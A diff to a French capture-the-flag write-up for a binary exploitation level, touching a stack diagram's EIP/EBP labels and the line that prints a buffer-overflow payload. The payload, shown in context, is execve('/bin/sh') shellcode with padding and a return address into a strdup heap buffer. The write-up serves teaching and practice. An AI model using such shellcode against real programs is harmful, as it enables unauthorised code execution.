@@ -62,9 +62,9 @@ $> objdump -d level2
 #	Cependant il est possible d'utiliser ce buffer et de modifier l'adresse contenue dans eip afin que celle ci soit l'adresse du debut du buffer. Voici un schema:
 
 |-------|
-|  EIP	|------> Adresse de eip etant l'adresse de retour apres la fonction p
+|  EIP	|------> Sauvegarde de eip etant l'adresse de retour apres la fonction p
 |-------|
-|  EBP  |------> Adresse de ebp
+|  EBP  |------> Sauvegarde de ebp
 |-------|---|
 |		| 	|
 |		|	|
@@ -104,6 +104,7 @@ strdup("test")                                               = 0x0804a008
 +++ exited (status 8) +++
 
 #	Ce qui nous donne ce shellcode:
+
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\xa0\x04\x08
 
 #	Je l'ai passe sous forme d'une commande plus simple a coller sur la vm:
